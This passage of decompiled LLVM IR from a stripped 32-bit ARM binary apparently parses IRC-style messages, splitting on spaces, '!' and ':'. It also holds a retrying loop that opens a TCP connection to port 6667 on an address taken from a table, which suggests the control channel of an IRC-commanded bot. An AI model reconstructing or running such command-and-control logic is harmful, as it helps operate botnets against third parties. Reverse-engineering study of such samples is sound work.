dec_label_pc_ba74:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba64
  %v1_ba78 = add i32 %.pre, 1
  store i32 %tmp, i32* @r0, align 4
  %v0_ba88 = call i32 @function_f2e0()
  %v9_ba90 = icmp eq i32 %stack_var_-40.0, %v0_ba88
  br i1 %v9_ba90, label %dec_label_pc_bd14, label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba74
  %v5_ba7c = inttoptr i32 %v1_ba78 to i8*
  %v1_ba9c = add nuw nsw i32 %storemerge820, 1
  %v7_baac = icmp slt i32 %v1_ba9c, 5
  br i1 %v7_baac, label %dec_label_pc_ba4c.preheader, label %dec_label_pc_bac8

dec_label_pc_ba4c.preheader:                      ; preds = %dec_label_pc_b9fc, %dec_label_pc_ba98
  %storemerge820 = phi i32 [ 0, %dec_label_pc_b9fc ], [ %v1_ba9c, %dec_label_pc_ba98 ]
  %stack_var_-40.119 = phi i32 [ 0, %dec_label_pc_b9fc ], [ %stack_var_-40.0, %dec_label_pc_ba98 ]
  %stack_var_-32.118 = phi i8* [ %arg3, %dec_label_pc_b9fc ], [ %v5_ba7c, %dec_label_pc_ba98 ]
  br label %dec_label_pc_ba4c

dec_label_pc_babc:                                ; preds = %dec_label_pc_bae0
  %v1_bac0 = add i32 %storemerge9, 1
  br label %dec_label_pc_bac8

dec_label_pc_bac8:                                ; preds = %dec_label_pc_ba98, %dec_label_pc_babc
  %storemerge9 = phi i32 [ %v1_bac0, %dec_label_pc_babc ], [ 0, %dec_label_pc_ba98 ]
  store i32 %storemerge9, i32* @r4, align 4
  store i32 %v1_ba78, i32* @r0, align 4
  %v0_bad0 = call i32 @function_f2e0()
  %v0_bad8 = load i32, i32* @r4, align 4
  %v3_bad8 = icmp ult i32 %v0_bad8, %v0_bad0
  br i1 %v3_bad8, label %dec_label_pc_bae0, label %dec_label_pc_bac8.dec_label_pc_bafc_crit_edge

dec_label_pc_bac8.dec_label_pc_bafc_crit_edge:    ; preds = %dec_label_pc_bac8
  %.pre26 = add i32 %storemerge9, %v1_ba78
  %.pre27 = inttoptr i32 %.pre26 to i8*
  br label %dec_label_pc_bafc

dec_label_pc_bae0:                                ; preds = %dec_label_pc_bac8
  %v2_baec = add i32 %storemerge9, %v1_ba78
  %v1_baf0 = inttoptr i32 %v2_baec to i8*
  %v2_baf0 = load i8, i8* %v1_baf0, align 1
  %v7_baf4 = icmp eq i8 %v2_baf0, 32
  br i1 %v7_baf4, label %dec_label_pc_bafc, label %dec_label_pc_babc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_bae0, %dec_label_pc_bac8.dec_label_pc_bafc_crit_edge
  %v3_bb10.pre-phi = phi i8* [ %.pre27, %dec_label_pc_bac8.dec_label_pc_bafc_crit_edge ], [ %v1_baf0, %dec_label_pc_bae0 ]
  store i8 0, i8* %v3_bb10.pre-phi, align 1
  %v2_bb18 = load i32, i32* @global_var_25604.175, align 4
  %v4_bb24 = call i32 @function_f664(i8* %v5_ba7c, i32 %v2_bb18)
  %v2_bb2c = icmp eq i32 %v4_bb24, 0
  br i1 %v2_bb2c, label %dec_label_pc_bb34, label %dec_label_pc_bd14

dec_label_pc_bb34:                                ; preds = %dec_label_pc_bafc
  %v2_bb38 = load i32, i32* @global_var_22eac.20, align 4
  %v2_bb3c = icmp eq i32 %v2_bb38, 0
  br i1 %v2_bb3c, label %dec_label_pc_bb44, label %dec_label_pc_bd14

dec_label_pc_bb44:                                ; preds = %dec_label_pc_bb34
  br label %dec_label_pc_bb78.preheader

dec_label_pc_bb60:                                ; preds = %dec_label_pc_bb90
  %v1_bb64 = add i32 %.pre28, 1
  %v5_bb68 = inttoptr i32 %v1_bb64 to i8*
  %v1_bb70 = add i32 %stack_var_-40.2, 1
  br label %dec_label_pc_bb78

dec_label_pc_bb78:                                ; preds = %dec_label_pc_bb78.preheader, %dec_label_pc_bb60
  %stack_var_-32.2 = phi i8* [ %v5_bb68, %dec_label_pc_bb60 ], [ %stack_var_-32.315, %dec_label_pc_bb78.preheader ]
  %stack_var_-40.2 = phi i32 [ %v1_bb70, %dec_label_pc_bb60 ], [ %stack_var_-40.316, %dec_label_pc_bb78.preheader ]
  store i32 %tmp, i32* @r0, align 4
  %v0_bb80 = call i32 @function_f2e0()
  %v3_bb88 = icmp ult i32 %stack_var_-40.2, %v0_bb80
  %.pre28 = ptrtoint i8* %stack_var_-32.2 to i32
  br i1 %v3_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bba0

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb78
  %v2_bb94 = load i8, i8* %stack_var_-32.2, align 1
  %v7_bb98 = icmp eq i8 %v2_bb94, 32
  br i1 %v7_bb98, label %dec_label_pc_bba0, label %dec_label_pc_bb60

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bb78, %dec_label_pc_bb90
  %v1_bba4 = add i32 %.pre28, 1
  store i32 %tmp, i32* @r0, align 4
  %v0_bbb4 = call i32 @function_f2e0()
  %v9_bbbc = icmp eq i32 %stack_var_-40.2, %v0_bbb4
  br i1 %v9_bbbc, label %dec_label_pc_bd14, label %dec_label_pc_bbc4

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bba0
  %v5_bba8 = inttoptr i32 %v1_bba4 to i8*
  %v1_bbc8 = add nuw nsw i32 %storemerge1017, 1
  %v7_bbd8 = icmp slt i32 %v1_bbc8, 3
  br i1 %v7_bbd8, label %dec_label_pc_bb78.preheader, label %dec_label_pc_bbf4

dec_label_pc_bb78.preheader:                      ; preds = %dec_label_pc_bb44, %dec_label_pc_bbc4
  %storemerge1017 = phi i32 [ 0, %dec_label_pc_bb44 ], [ %v1_bbc8, %dec_label_pc_bbc4 ]
  %stack_var_-40.316 = phi i32 [ 0, %dec_label_pc_bb44 ], [ %stack_var_-40.2, %dec_label_pc_bbc4 ]
  %stack_var_-32.315 = phi i8* [ %arg3, %dec_label_pc_bb44 ], [ %v5_bba8, %dec_label_pc_bbc4 ]
  br label %dec_label_pc_bb78

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bc0c
  %v1_bbec = add i32 %storemerge11, 1
  br label %dec_label_pc_bbf4

dec_label_pc_bbf4:                                ; preds = %dec_label_pc_bbc4, %dec_label_pc_bbe8
  %storemerge11 = phi i32 [ %v1_bbec, %dec_label_pc_bbe8 ], [ 0, %dec_label_pc_bbc4 ]
  store i32 %storemerge11, i32* @r4, align 4
  store i32 %v1_bba4, i32* @r0, align 4
  %v0_bbfc = call i32 @function_f2e0()
  %v0_bc04 = load i32, i32* @r4, align 4
  %v3_bc04 = icmp ult i32 %v0_bc04, %v0_bbfc
  br i1 %v3_bc04, label %dec_label_pc_bc0c, label %dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge

dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge:    ; preds = %dec_label_pc_bbf4
  %.pre29 = add i32 %storemerge11, %v1_bba4
  %.pre30 = inttoptr i32 %.pre29 to i8*
  br label %dec_label_pc_bc28

dec_label_pc_bc0c:                                ; preds = %dec_label_pc_bbf4
  %v2_bc18 = add i32 %storemerge11, %v1_bba4
  %v1_bc1c = inttoptr i32 %v2_bc18 to i8*
  %v2_bc1c = load i8, i8* %v1_bc1c, align 1
  %v7_bc20 = icmp eq i8 %v2_bc1c, 32
  br i1 %v7_bc20, label %dec_label_pc_bc28, label %dec_label_pc_bbe8

dec_label_pc_bc28:                                ; preds = %dec_label_pc_bc0c, %dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge
  %v3_bc3c.pre-phi = phi i8* [ %.pre30, %dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge ], [ %v1_bc1c, %dec_label_pc_bc0c ]
  store i8 0, i8* %v3_bc3c.pre-phi, align 1
  store i32 %v1_bba4, i32* @r0, align 4
  %v2_bc44 = call i32 @function_fa50(i32 %v1_bba4)
  %v5_bc4c = trunc i32 %v2_bc44 to i8
  store i8 %v5_bc4c, i8* %stack_var_-44, align 1
  %v3_bc54 = icmp eq i8 %v5_bc4c, -1
  br i1 %v3_bc54, label %dec_label_pc_bc5c, label %dec_label_pc_bcb8

dec_label_pc_bc5c:                                ; preds = %dec_label_pc_bc28
  store i32 %v1_bba4, i32* @r0, align 4
  %v2_bc60 = call i32 @function_fa78(i32 %v1_bba4)
  %v2_bc70 = icmp eq i32 %v2_bc60, 0
  br i1 %v2_bc70, label %dec_label_pc_bc78, label %dec_label_pc_bc94

dec_label_pc_bc78:                                ; preds = %dec_label_pc_bc5c
  %v2_bc7c = load i32, i32* @global_var_25718.173, align 4
  store i32 %v2_bc7c, i32* @r2, align 4
  %v3_bc8c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_19318.208 to i32))
  br label %dec_label_pc_bd14

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc5c
  %v1_bc98 = add i32 %v2_bc60, 16
  %v2_bc98 = inttoptr i32 %v1_bc98 to i32*
  %v3_bc98 = load i32, i32* %v2_bc98, align 4
  %v1_bc9c = inttoptr i32 %v3_bc98 to i32*
  %v2_bc9c = load i32, i32* %v1_bc9c, align 4
  store i32 %v2_bc9c, i32* @r1, align 4
  %v1_bca4 = add i32 %v2_bc60, 12
  %v2_bca4 = inttoptr i32 %v1_bca4 to i32*
  %v3_bca4 = load i32, i32* %v2_bca4, align 4
  store i32 %v3_bca4, i32* @r2, align 4
  %v2_bcac = ptrtoint i8* %stack_var_-44 to i32
  store i32 %v2_bcac, i32* @r3, align 4
  store i32 %v2_bcac, i32* @r0, align 4
  %v0_bcb4 = call i32 @function_f350()
  %v2_bcc4.pre = load i8, i8* %stack_var_-44, align 1
  br label %dec_label_pc_bcb8

dec_label_pc_bcb8:                                ; preds = %dec_label_pc_bc28, %dec_label_pc_bc94
  %v1_bd1c25 = phi i32 [ %v0_bcb4, %dec_label_pc_bc94 ], [ %v2_bc44, %dec_label_pc_bc28 ]
  %v2_bcc4 = phi i8 [ %v2_bcc4.pre, %dec_label_pc_bc94 ], [ %v5_bc4c, %dec_label_pc_bc28 ]
  store i8 %v2_bcc4, i8* bitcast (i8** @global_var_22eab.210 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_22ea8.18 to i8*), align 4
  store i32 256, i32* @global_var_22eac.20, align 4
  br label %dec_label_pc_bd14

dec_label_pc_bd14:                                ; preds = %dec_label_pc_ba74, %dec_label_pc_bba0, %dec_label_pc_bb34, %dec_label_pc_bafc, %dec_label_pc_bc78, %dec_label_pc_bcb8
  %v1_bd1c = phi i32 [ 0, %dec_label_pc_bb34 ], [ %v4_bb24, %dec_label_pc_bafc ], [ %v3_bc8c, %dec_label_pc_bc78 ], [ %v1_bd1c25, %dec_label_pc_bcb8 ], [ %v0_bbb4, %dec_label_pc_bba0 ], [ %v0_ba88, %dec_label_pc_ba74 ]
  ret i32 %v1_bd1c

; uselistorder directives
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %v1_bbc8, { 1, 0 }
  uselistorder i32 %v1_bba4, { 3, 2, 5, 4, 0, 1, 6, 7 }
  uselistorder i32 %stack_var_-40.2, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.2, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %v1_ba9c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** @global_var_22ea8.18, { 0, 1, 4, 3, 2 }
  uselistorder i32* @global_var_22eac.20, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd14, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bcb8, { 1, 0 }
  uselistorder label %dec_label_pc_bbf4, { 1, 0 }
  uselistorder label %dec_label_pc_bb78.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_bba0, { 1, 0 }
  uselistorder label %dec_label_pc_bac8, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ba74, { 1, 0 }
}

define i32 @function_bd34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bd34:
  %stack_var_-4 = alloca i32, align 4
  store i32 48448, i32* %stack_var_-4, align 4
  %v2_bd3c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd3c, i32* @fp, align 4
  %v2_bd54 = load i32, i32* @global_var_25604.175, align 4
  store i32 %v2_bd54, i32* @r0, align 4
  %v0_bd5c = call i32 @function_108e4()
  %v0_bd60 = call i32 @function_86b4()
  store i32 %v0_bd60, i32* @global_var_25604.175, align 4
  ret i32 %v0_bd60

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_bd80(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_bd80:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  store i32 48524, i32* %stack_var_-4, align 4
  %v2_bd88 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd88, i32* @fp, align 4
  br label %dec_label_pc_bdb4

dec_label_pc_bda8:                                ; preds = %dec_label_pc_bdcc
  %v1_bdac = add i32 %storemerge2, 1
  br label %dec_label_pc_bdb4

dec_label_pc_bdb4:                                ; preds = %dec_label_pc_bd80, %dec_label_pc_bda8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_bd80 ], [ %v1_bdac, %dec_label_pc_bda8 ]
  store i32 %storemerge2, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_bdbc = call i32 @function_f2e0()
  %v0_bdc4 = load i32, i32* @r4, align 4
  %v3_bdc4 = icmp ult i32 %v0_bdc4, %v0_bdbc
  br i1 %v3_bdc4, label %dec_label_pc_bdcc, label %dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge

dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge:    ; preds = %dec_label_pc_bdb4
  %.pre = add i32 %storemerge2, %arg2
  %.pre4 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_bde8

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdb4
  %v2_bdd8 = add i32 %storemerge2, %arg2
  %v1_bddc = inttoptr i32 %v2_bdd8 to i8*
  %v2_bddc = load i8, i8* %v1_bddc, align 1
  %v7_bde0 = icmp eq i8 %v2_bddc, 33
  br i1 %v7_bde0, label %dec_label_pc_bde8, label %dec_label_pc_bda8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdcc, %dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge
  %v3_bdfc.pre-phi = phi i8* [ %.pre4, %dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge ], [ %v1_bddc, %dec_label_pc_bdcc ]
  store i8 0, i8* %v3_bdfc.pre-phi, align 1
  %v2_be04 = load i32, i32* @global_var_25604.175, align 4
  %v2_be10 = inttoptr i32 %arg2 to i8*
  %v3_be10 = call i32 @function_f664(i8* %v2_be10, i32 %v2_be04)
  %v2_be18 = icmp eq i32 %v3_be10, 0
  br i1 %v2_be18, label %dec_label_pc_be20, label %dec_label_pc_be74

dec_label_pc_be20:                                ; preds = %dec_label_pc_bde8
  %v2_be24 = load i8, i8* %arg3, align 1
  %v7_be28 = icmp eq i8 %v2_be24, 58
  br i1 %v7_be28, label %dec_label_pc_be30, label %dec_label_pc_be3c

dec_label_pc_be30:                                ; preds = %dec_label_pc_be20
  %v1_be34 = add i32 %tmp, 1
  %v5_be38 = inttoptr i32 %v1_be34 to i8*
  br label %dec_label_pc_be3c

dec_label_pc_be3c:                                ; preds = %dec_label_pc_be20, %dec_label_pc_be30
  %stack_var_-44.0 = phi i8* [ %v5_be38, %dec_label_pc_be30 ], [ %arg3, %dec_label_pc_be20 ]
  %v2_be40 = load i32, i32* @global_var_25604.175, align 4
  %v2_be44 = icmp eq i32 %v2_be40, 0
  br i1 %v2_be44, label %dec_label_pc_be5c, label %dec_label_pc_be4c

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be3c
  store i32 %v2_be40, i32* @r0, align 4
  %v0_be58 = call i32 @function_108e4()
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be3c, %dec_label_pc_be4c
  %v4_be5c = ptrtoint i8* %stack_var_-44.0 to i32
  %v2_be60 = call i32 @function_f7d0(i32 %v4_be5c)
  store i32 %v2_be60, i32* @global_var_25604.175, align 4
  br label %dec_label_pc_be74

dec_label_pc_be74:                                ; preds = %dec_label_pc_bde8, %dec_label_pc_be5c
  %v1_be7c = phi i32 [ %v3_be10, %dec_label_pc_bde8 ], [ %v2_be60, %dec_label_pc_be5c ]
  ret i32 %v1_be7c

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_be74, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_be3c, { 1, 0 }
  uselistorder label %dec_label_pc_bdb4, { 1, 0 }
}

define i32 @function_be84() local_unnamed_addr {
dec_label_pc_be84:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_be88 = load i32, i32* @fp, align 4
  store i32 48784, i32* %stack_var_-4, align 4
  %v2_be8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_be8c, i32* @fp, align 4
  %v2_bfbc = ptrtoint i32* %stack_var_-40 to i32
  %v2_c00c = ptrtoint i32* %stack_var_-48 to i32
  %v2_c04c = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_be94

dec_label_pc_be94:                                ; preds = %dec_label_pc_be94.backedge, %dec_label_pc_be84
  store i32 -1, i32* @global_var_25608.10, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_beac = load i32, i32* @global_var_22ea0.132, align 4
  %v2_beb0 = icmp eq i32 %v2_beac, 0
  br i1 %v2_beb0, label %dec_label_pc_beb8, label %dec_label_pc_beec

dec_label_pc_beb8:                                ; preds = %dec_label_pc_be94
  %v0_beb8 = call i32 @function_10c88()
  %v2_bec4 = load i32, i32* inttoptr (i32 142172 to i32*), align 4
  %v2_bed0 = call i32 @function_cba0(i32 %v0_beb8, i32 %v2_bec4)
  %v4_bee0 = mul i32 %v2_bec4, 4
  %v5_bee0 = add i32 %v4_bee0, 142176
  %v6_bee0 = inttoptr i32 %v5_bee0 to i32*
  %v7_bee0 = load i32, i32* %v6_bee0, align 4
  store i32 %v7_bee0, i32* @global_var_25710.130, align 4
  br label %dec_label_pc_beec

dec_label_pc_beec:                                ; preds = %dec_label_pc_be94, %dec_label_pc_beb8
  store i32 0, i32* @global_var_22ea0.132, align 4
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_beec
  %v3_bf04 = call i32 @function_fc94(i32 2, i32 1, i32 6)
  store i32 %v3_bf04, i32* @global_var_25608.10, align 4
  %v1_bf1c = icmp slt i32 %v3_bf04, 0
  br i1 %v1_bf1c, label %dec_label_pc_bef8, label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %dec_label_pc_bef8
  %v2_bf28 = load i32, i32* @global_var_25710.130, align 4
  store i32 %v2_bf28, i32* @r0, align 4
  %v1_bf30 = call i32 @function_fa50(i32 %v2_bf28)
  %v2_bf38 = icmp eq i32 %v1_bf30, 0
  br i1 %v2_bf38, label %dec_label_pc_bf5c, label %dec_label_pc_bf40

dec_label_pc_bf40:                                ; preds = %dec_label_pc_bf24
  %v2_bf44 = load i32, i32* @global_var_25710.130, align 4
  store i32 %v2_bf44, i32* @r0, align 4
  %v1_bf4c = call i32 @function_fa50(i32 %v2_bf44)
  %v3_bf54 = icmp eq i32 %v1_bf4c, -1
  br i1 %v3_bf54, label %dec_label_pc_bf5c, label %dec_label_pc_bfd0

dec_label_pc_bf5c:                                ; preds = %dec_label_pc_bf40, %dec_label_pc_bf24
  %v2_bf60 = load i32, i32* @global_var_25710.130, align 4
  store i32 %v2_bf60, i32* @r0, align 4
  %v1_bf68 = call i32 @function_fa78(i32 %v2_bf60)
  %v2_bf78 = icmp eq i32 %v1_bf68, 0
  br i1 %v2_bf78, label %dec_label_pc_bf80, label %dec_label_pc_bfa0

dec_label_pc_bf80:                                ; preds = %dec_label_pc_bf5c
  store i32 0, i32* @global_var_25710.130, align 4
  %v2_bf90 = load i32, i32* @global_var_25608.10, align 4
  %v1_bf98 = call i32 @function_cda4(i32 %v2_bf90)
  br label %dec_label_pc_be94.backedge

dec_label_pc_be94.backedge:                       ; preds = %dec_label_pc_bf80, %dec_label_pc_c140
  br label %dec_label_pc_be94

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf5c
  %v1_bfa4 = add i32 %v1_bf68, 16
  %v2_bfa4 = inttoptr i32 %v1_bfa4 to i32*
  %v3_bfa4 = load i32, i32* %v2_bfa4, align 4
  %v1_bfa8 = inttoptr i32 %v3_bfa4 to i32*
  %v2_bfa8 = load i32, i32* %v1_bfa8, align 4
  %v1_bfb0 = add i32 %v1_bf68, 12
  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i32*
  %v3_bfb0 = load i32, i32* %v2_bfb0, align 4
  store i32 %v3_bfb0, i32* @r2, align 4
  store i32 %v2_bfbc, i32* @r3, align 4
  %v3_bfc8 = call i32 @function_f340(i32 %v2_bfa8, i32 %v2_bfbc, i32 %v3_bfb0)
  br label %dec_label_pc_bfe8

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_bf40
  %v2_bfd4 = load i32, i32* @global_var_25710.130, align 4
  store i32 %v2_bfd4, i32* @r0, align 4
  %v1_bfdc = call i32 @function_fa50(i32 %v2_bfd4)
  store i32 %v1_bfdc, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bfe8

dec_label_pc_bfe8:                                ; preds = %dec_label_pc_bfa0, %dec_label_pc_bfd0
  store i32 2, i32* %stack_var_-44, align 4
  %v1_bff8 = call i32 @function_f8a4(i32 6667)
  %v2_c008 = load i32, i32* @global_var_25608.10, align 4
  store i32 %v2_c008, i32* @r3, align 4
  %v3_c01c = call i32 @function_cd50(i32 %v2_c008, i32 21537, i32 %v2_c00c)
  %v2_c024 = call i32 @function_cbf4(i32* null)
  br label %dec_label_pc_c120

dec_label_pc_c034:                                ; preds = %dec_label_pc_c120
  %v0_c034 = call i32 @function_ce08()
  %v2_c040 = inttoptr i32 %v0_c034 to i32*
  store i32 0, i32* %v2_c040, align 4
  %v2_c048 = load i32, i32* @global_var_25608.10, align 4
  %v3_c05c = call i32 @function_fb6c(i32 %v2_c048, i32 %v2_c04c, i32 16)
  %v2_c064 = icmp eq i32 %v3_c05c, 0
  br i1 %v2_c064, label %dec_label_pc_c080, label %dec_label_pc_c06c

dec_label_pc_c06c:                                ; preds = %dec_label_pc_c034
  %v0_c06c = call i32 @function_ce08()
  %v1_c074 = inttoptr i32 %v0_c06c to i32*
  %v2_c074 = load i32, i32* %v1_c074, align 4
  %v7_c078 = icmp eq i32 %v2_c074, 106
  br i1 %v7_c078, label %dec_label_pc_c080, label %dec_label_pc_c0f0

dec_label_pc_c080:                                ; preds = %dec_label_pc_c06c, %dec_label_pc_c034
  %v2_c084 = load i32, i32* @global_var_25608.10, align 4
  %v5_c0a0 = call i32 @function_fc50(i32 %v2_c084, i32 1, i32 13, i32 0, i32 0)
  %v2_c0a8 = load i32, i32* @global_var_25608.10, align 4
  %v5_c0c4 = call i32 @function_fc50(i32 %v2_c0a8, i32 1, i32 2, i32 0, i32 0)
  %v2_c0cc = load i32, i32* @global_var_25608.10, align 4
  %v5_c0e8 = call i32 @function_fc50(i32 %v2_c0cc, i32 1, i32 9, i32 0, i32 0)
  store i32 %v3_be88, i32* @fp, align 4
  ret i32 %v5_c0e8

dec_label_pc_c0f0:                                ; preds = %dec_label_pc_c06c
  %v0_c0f0 = call i32 @function_ce08()
  %v1_c0f8 = inttoptr i32 %v0_c0f0 to i32*
  %v2_c0f8 = load i32, i32* %v1_c0f8, align 4
  %v7_c0fc = icmp eq i32 %v2_c0f8, 115
  br i1 %v7_c0fc, label %dec_label_pc_c118, label %dec_label_pc_c104

dec_label_pc_c104:                                ; preds = %dec_label_pc_c0f0
  %v0_c104 = call i32 @function_ce08()
  %v1_c10c = inttoptr i32 %v0_c104 to i32*
  %v2_c10c = load i32, i32* %v1_c10c, align 4
  %v7_c110 = icmp eq i32 %v2_c10c, 114
  br i1 %v7_c110, label %dec_label_pc_c118, label %dec_label_pc_c140

dec_label_pc_c118:                                ; preds = %dec_label_pc_c104, %dec_label_pc_c0f0
  %v1_c11c = call i32 @function_11544(i32 1)
  br label %dec_label_pc_c120

dec_label_pc_c120:                                ; preds = %dec_label_pc_bfe8, %dec_label_pc_c118
  %v2_c124 = call i32 @function_cbf4(i32* null)
  %v2_c134 = sub i32 %v2_c124, %v2_c024
  %tmp = icmp ult i32 %v2_c134, 10
  br i1 %tmp, label %dec_label_pc_c034, label %dec_label_pc_c140

dec_label_pc_c140:                                ; preds = %dec_label_pc_c104, %dec_label_pc_c120
  store i32 0, i32* @global_var_25710.130, align 4
  %v2_c150 = load i32, i32* @global_var_25608.10, align 4
  %v1_c158 = call i32 @function_cda4(i32 %v2_c150)
  br label %dec_label_pc_be94.backedge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @function_11544, { 17, 0, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_fc50, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_f8a4, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_f340, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fa78, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fa50, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10c88, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_22ea0.132, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c140, { 1, 0 }
  uselistorder label %dec_label_pc_c120, { 1, 0 }
  uselistorder label %dec_label_pc_bfe8, { 1, 0 }
  uselistorder label %dec_label_pc_be94.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_beec, { 1, 0 }
}

define i32 @function_c174(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c174:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-1484 = alloca i32, align 4
  %stack_var_-2508 = alloca i32, align 4
  %stack_var_-6604 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_c174 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c174, label %bb, label %.thread22

bb:                                               ; preds = %dec_label_pc_c174
  %v1_c174 = load i32, i32* %r2.global-to-local, align 4
  %v2_c174 = load i32, i32* @ip, align 4
  %v3_c174 = load i32, i32* @fp, align 4
  %v8_c174 = ashr i32 %v2_c174, %v3_c174
  %v3_c178 = udiv i32 %arg1, 4194304
  %v4_c178 = mul i32 %arg1, 1024
  %v5_c178 = or i32 %v3_c178, %v4_c178
  %v9_c174 = and i32 %v1_c174, %v5_c178
  %v8_c178 = and i32 %v9_c174, %v8_c174
  store i32 %v8_c178, i32* %r2.global-to-local, align 4
  %v3_c17c = load i32, i32* @r7, align 4
  %v8_c17c = shl i32 %arg1, %v3_c17c
  %v9_c17c = and i32 %v8_c17c, %v8_c178
  store i32 %v9_c17c, i32* @r5, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_c174, %bb
  store i32 49548, i32* %stack_var_-4, align 4
  %v2_c188 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c188, i32* @fp, align 4
  %v2_c19c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_c19c, i32* %r2.global-to-local, align 4
  %v3_c1b0 = add i32 %v2_c19c, -6592
  %v4_c1b0 = inttoptr i32 %v3_c1b0 to i32*
  store i32 %arg2, i32* %v4_c1b0, align 4
  %v1_c1b4 = call i32 @function_cc24(i32 %v2_c19c)
  %v2_c1bc = icmp eq i32 %v1_c1b4, 0
  br i1 %v2_c1bc, label %dec_label_pc_c1cc, label %dec_label_pc_c1c4

dec_label_pc_c1c4:                                ; preds = %.thread22
  %v1_c1c8 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %.thread22, %dec_label_pc_c1c4
  %v4_c1d8 = load i32, i32* %v4_c1b0, align 4
  %v1_c1dc = inttoptr i32 %v4_c1d8 to i32*
  %v2_c1dc = load i32, i32* %v1_c1dc, align 4
  store i32 %v2_c1dc, i32* @r4, align 4
  store i32 %v2_c19c, i32* %r2.global-to-local, align 4
  %v4_c1ec = load i32, i32* %v4_c1b0, align 4
  %v1_c1f0 = inttoptr i32 %v4_c1ec to i32*
  %v2_c1f0 = load i32, i32* %v1_c1f0, align 4
  store i32 %v2_c1f0, i32* @r0, align 4
